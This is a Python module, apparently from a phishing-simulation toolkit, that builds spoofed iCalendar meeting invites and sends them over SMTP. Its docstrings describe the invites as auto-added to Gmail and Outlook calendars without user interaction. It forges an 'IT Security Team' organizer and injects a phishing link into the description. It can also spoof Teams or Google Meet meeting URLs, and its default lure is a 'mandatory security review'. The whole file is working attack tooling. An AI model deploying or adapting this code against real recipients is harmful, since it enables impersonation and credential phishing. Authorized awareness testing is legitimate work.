"""Google Calendar invite sender — weaponizes iCalendar auto-processing.

Adapted from Tangled (https://github.com/ineesdv/Tangled) — Apache-2.0 License.
Sends spoofed meeting invites that are automatically added to Gmail/Outlook calendars.
"""

import os
import uuid
import smtplib
import logging
from datetime import datetime, timezone, timedelta
from email.message import EmailMessage
from email.utils import formatdate, make_msgid
from email.policy import SMTP as SMTP_POLICY

logger = logging.getLogger(__name__)

SMTP_HOST = os.getenv("SMTP_HOST", "localhost")
SMTP_PORT = int(os.getenv("SMTP_PORT", "1025"))

# Defaults
DEFAULT_ORGANIZER_CN = "IT Security Team"
DEFAULT_ORGANIZER_EMAIL = "security@company-it.com"
DEFAULT_PRODID = "-//PhishGuard//CalendarInvite//EN"
DEFAULT_TZ = "Europe/Bucharest"


def _make_vtimezone(tzid: str) -> tuple[str, str]:
    """Build a VTIMEZONE block for the given timezone."""
    try:
        from zoneinfo import ZoneInfo
        now = datetime.now(ZoneInfo(tzid))
        tz_label = now.tzname() or tzid
        offset = now.strftime("%z")
    except Exception:
        tz_label = tzid
        offset = "+0200"

    off_fmt = f"{offset[:3]}{offset[3:]}"

    block = (
        "BEGIN:VTIMEZONE\r\n"
        f"TZID:{tz_label}\r\n"
        "BEGIN:STANDARD\r\n"
        "DTSTART:16010101T020000\r\n"
        f"TZOFFSETFROM:{off_fmt}\r\n"
        f"TZOFFSETTO:{off_fmt}\r\n"
        "RRULE:FREQ=YEARLY;BYMONTH=11;BYDAY=1SU\r\n"
        "END:STANDARD\r\n"
        "BEGIN:DAYLIGHT\r\n"
        "DTSTART:16010101T020000\r\n"
        f"TZOFFSETFROM:{off_fmt}\r\n"
        f"TZOFFSETTO:{off_fmt}\r\n"
        "RRULE:FREQ=YEARLY;BYMONTH=3;BYDAY=2SU\r\n"
        "END:DAYLIGHT\r\n"
        "END:VTIMEZONE\r\n"
    )
    return tz_label, block


def build_calendar_ics(
    *,
    uid: str,
    organizer_cn: str,
    organizer_email: str,
    target_cn: str,
    target_email: str,
    meeting_summary: str,
    description: str,
    begin_dt: datetime,
    end_dt: datetime,
    phish_url: str | None = None,
    tzid: str = DEFAULT_TZ,
    prodid: str = DEFAULT_PRODID,
    meeting_provider: str | None = None,
    meeting_url: str | None = None,
    location: str | None = None,
    extra_attendees: list[dict] | None = None,
    is_cancel: bool = False,
) -> str:
    """Build an iCalendar .ics string for a spoofed meeting invite.

    When sent as text/calendar with METHOD:REQUEST, Gmail and Outlook
    will automatically add this event to the target's calendar.
    """
    now_utc = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    begin_local = begin_dt.strftime("%Y%m%dT%H%M%S")
    end_local = end_dt.strftime("%Y%m%dT%H%M%S")

    # Build attendees
    attendees = (
        f'ATTENDEE;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;'
        f'RSVP=TRUE;CN="{target_cn}":mailto:{target_email}\r\n'
    )
    for a in (extra_attendees or []):
        cn = a.get("cn", "")
        em = a.get("email", "")
        if em:
            attendees += (
                f'ATTENDEE;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;'
                f'RSVP=TRUE;CN="{cn}":mailto:{em}\r\n'
            )

    # Meeting provider block (Teams / Google Meet spoofing)
    meeting_block = ""
    if not is_cancel and meeting_url:
        if meeting_provider == "teams":
            meeting_block = (
                'X-MICROSOFT-ONLINEMEETINGINFORMATION:{"OnlineMeetingChannelId":null,"OnlineMeetingProvider":3}\r\n'
                f"X-MICROSOFT-SKYPETEAMSMEETINGURL:{meeting_url}\r\n"
                f"X-MICROSOFT-LOCATIONDISPLAYNAME:Microsoft Teams Meeting\r\n"
            )
        elif meeting_provider == "gmeet":
            meeting_block = (
                f"X-GOOGLE-CONFERENCE:{meeting_url}\r\n"
                f"CREATED:{now_utc}\r\n"
                f"LAST-MODIFIED:{now_utc}\r\n"
            )

    tz_label, vtz = _make_vtimezone(tzid)
    location_line = f"LOCATION:{location}\r\n" if location else ""

    # Inject phishing link into description
    desc = description
    if phish_url:
        desc += f"\\n\\nJoin meeting: {phish_url}"

    ical = (
        "BEGIN:VCALENDAR\r\n"
        f"METHOD:{'CANCEL' if is_cancel else 'REQUEST'}\r\n"
        f"PRODID:{prodid}\r\n"
        "VERSION:2.0\r\n"
        f"{vtz}"
        "BEGIN:VEVENT\r\n"
        f'ORGANIZER;CN="{organizer_cn}":mailto:{organizer_email}\r\n'
        f"{attendees}"
        f"DESCRIPTION:{desc}\r\n"
        f"UID:{uid}\r\n"
        f"SUMMARY:{meeting_summary}\r\n"
        f"DTSTART;TZID={tz_label}:{begin_local}\r\n"
        f"DTEND;TZID={tz_label}:{end_local}\r\n"
        "CLASS:PUBLIC\r\n"
        "PRIORITY:5\r\n"
        f"DTSTAMP:{now_utc}\r\n"
        "TRANSP:OPAQUE\r\n"
        "STATUS:CONFIRMED\r\n"
        "SEQUENCE:0\r\n"
        f"{location_line}"
        "X-MICROSOFT-CDO-BUSYSTATUS:TENTATIVE\r\n"
        "X-MICROSOFT-CDO-INTENDEDSTATUS:BUSY\r\n"
        "X-MICROSOFT-CDO-ALLDAYEVENT:FALSE\r\n"
        "X-MICROSOFT-CDO-IMPORTANCE:1\r\n"
        "X-MICROSOFT-CDO-INSTTYPE:0\r\n"
        "X-MICROSOFT-DONOTFORWARDMEETING:FALSE\r\n"
        f"{meeting_block}"
        "BEGIN:VALARM\r\n"
        "ACTION:DISPLAY\r\n"
        "DESCRIPTION:REMINDER\r\n"
        "TRIGGER;RELATED=START:-PT15M\r\n"
        "END:VALARM\r\n"
        "END:VEVENT\r\n"
        "END:VCALENDAR\r\n"
    )
    return ical


def send_calendar_invite(
    to_email: str,
    to_name: str,
    subject: str,
    body_html: str,
    phish_url: str | None = None,
    meeting_summary: str = "Mandatory: Annual Security Compliance Review",
    description: str = "Please join this mandatory security review meeting.",
    organizer_cn: str = DEFAULT_ORGANIZER_CN,
    organizer_email: str = DEFAULT_ORGANIZER_EMAIL,
    begin_dt: datetime | None = None,
    end_dt: datetime | None = None,
    meeting_provider: str | None = None,
    meeting_url: str | None = None,
    location: str | None = None,
) -> bool:
    """Send a phishing email with an embedded iCalendar invite.

    The invite auto-adds to the target's Google Calendar / Outlook calendar
    without any user interaction, leveraging RFC 5546 iTIP processing.
    """
    if not to_email:
        logger.warning("No email address provided for calendar invite")
        return False

    try:
        # Default: schedule 2 hours from now, 30 min duration
        if begin_dt is None:
            begin_dt = datetime.now() + timedelta(hours=2)
        if end_dt is None:
            end_dt = begin_dt + timedelta(minutes=30)

        cal_uid = str(uuid.uuid4())

        ics = build_calendar_ics(
            uid=cal_uid,
            organizer_cn=organizer_cn,
            organizer_email=organizer_email,
            target_cn=to_name or to_email,
            target_email=to_email,
            meeting_summary=meeting_summary,
            description=description,
            begin_dt=begin_dt,
            end_dt=end_dt,
            phish_url=phish_url,
            meeting_provider=meeting_provider,
            meeting_url=meeting_url,
            location=location,
        )

        # Build the email with calendar attachment
        msg = EmailMessage(policy=SMTP_POLICY)
        msg["From"] = f"{organizer_cn} <{organizer_email}>"
        msg["To"] = to_email
        msg["Subject"] = subject
        msg["Date"] = formatdate(localtime=True)
        msg["Message-ID"] = make_msgid(domain=organizer_email.split("@")[1])
        msg["MIME-Version"] = "1.0"

        # Set HTML body
        if body_html:
            import re
            plain = re.sub(r"<[^>]+>", "", body_html).strip()
            msg.set_content(plain, charset="utf-8")
            msg.add_alternative(body_html, subtype="html", charset="utf-8")

        # Attach the calendar invite as text/calendar — this is the key part
        # Gmail and Outlook process METHOD:REQUEST automatically
        msg.add_alternative(
            ics,
            subtype="calendar",
            charset="utf-8",
        )
        # Fix content type to include method
        cal_part = msg.get_payload()[-1]
        cal_part.replace_header(
            "Content-Type",
            'text/calendar; method=REQUEST; charset="utf-8"',
        )

        # Send via SMTP
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
            server.send_message(msg, from_addr=organizer_email, to_addrs=[to_email])

        logger.info(f"📅 Calendar invite sent to {to_email} (UID: {cal_uid})")
        return True

    except Exception as e:
        logger.error(f"Calendar invite failed to {to_email}: {e}")
        return False
